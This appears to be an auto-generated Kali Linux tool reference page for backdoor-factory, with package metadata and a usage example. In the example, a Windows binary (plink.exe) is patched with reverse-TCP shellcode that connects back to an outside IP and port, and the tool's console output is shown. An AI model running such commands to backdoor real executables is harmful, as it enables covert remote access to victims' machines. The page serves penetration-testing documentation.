---
tool_id: backdoor-factory
title: backdoor-factory
categories: ["exploitation-tools"]
category_slugs: ["exploitation-tools"]
homepage: https://github.com/secretsquirrel/the-backdoor-factory
repository: 
version: 3.4.2+dfsg-5
architectures: all
license: 
binaries: []
metapackages: ["kali-linux-everything kali-linux-large kali-linux-nethunter kali-tools-post-exploitation kali-tools-social-engineering"]
icon: images/backdoor-factory-logo.svg
source_path: kali-tools\backdoor-factory\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:06.797463
---

# Tool: backdoor-factory (backdoor-factory)

## Categories
- [exploitation-tools](../exploitation-tools.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://github.com/secretsquirrel/the-backdoor-factory](https://github.com/secretsquirrel/the-backdoor-factory) |
| Repository |  |
| Version | 3.4.2+dfsg-5 |
| Architectures | all |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-everything kali-linux-large kali-linux-nethunter kali-tools-post-exploitation kali-tools-social-engineering |
| Icon | images/backdoor-factory-logo.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **archived**: true
- **Repository**: https://salsa.debian.org/pkg-security-team/backdoor-factory
- **PackagesInfo**: |
- ****Installed size**: ** `735 KB`
- ****How to install**: ** `sudo apt install backdoor-factory`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# backdoor-factory -h
- **Usage**: backdoor-factory [options]
- **Options**: []
- **-X, --xp_mode         Default**: DO NOT support for XP legacy machines, use -X


## Documentation (Upstream)

{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## backdoor-factory Usage Example

Specify the binary to backdoor (`-f /usr/share/windows-binaries/plink.exe`), set the connect-back IP (`-H 192.168.1.202`), the connect-back port (`-P 4444`), and the shell to use (`-s reverse_shell_tcp`):

```console
root@kali:~# backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp_inline
    ____  ____  ______           __
   / __ )/ __ \/ ____/___ ______/ /_____  _______  __
  / __  / / / / /_  / __ `/ ___/ __/ __ \/ ___/ / / /
 / /_/ / /_/ / __/ / /_/ / /__/ /_/ /_/ / /  / /_/ /
/_____/_____/_/    \__,_/\___/\__/\____/_/   \__, /
                                            /____/

         Author:    Joshua Pitts
         Email:     the.midnite.runr[-at ]gmail<d o-t>com
         Twitter:   @midnite_runr
         IRC:       freenode.net #BDFactory

         Version:   3.4.2

[*] In the backdoor module
[*] Checking if binary is supported
[*] Gathering file info
[*] Reading win32 entry instructions
[*] Looking for and setting selected shellcode
[*] Creating win32 resume execution stub
[*] Looking for caves that will fit the minimum shellcode length of 367
[*] All caves lengths:  367
############################################################
The following caves can be used to inject code and possibly
continue execution.
**Don't like what you see? Use jump, single, append, or ignore.**
############################################################
[*] Cave 1 length as int: 367
[*] Available caves:
1. Section Name: None; Section Begin: None End: None; Cave begin: 0x284 End: 0xffc; Cave Size: 3448
2. Section Name: .text; Section Begin: 0x1000 End: 0x37000; Cave begin: 0x36985 End: 0x36ffc; Cave Size: 1655
3. Section Name: .rdata; Section Begin: 0x37000 End: 0x48000; Cave begin: 0x47cf0 End: 0x48000; Cave Size: 784
4. Section Name: .data; Section Begin: 0x48000 End: 0x4a000; Cave begin: 0x48965 End: 0x48b8c; Cave Size: 551
5. Section Name: None; Section Begin: None End: None; Cave begin: 0x49080 End: 0x4a00a; Cave Size: 3978
**************************************************
[!] Enter your selection: 2
[!] Using selection: 2
[*] Changing flags for section: .text
[*] Patching initial entry instructions
[*] Creating win32 resume execution stub
[*] Looking for and setting selected shellcode
File plink.exe is in the 'backdoored' directory
```


## Source
- Path: kali-tools\backdoor-factory\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:06.797463
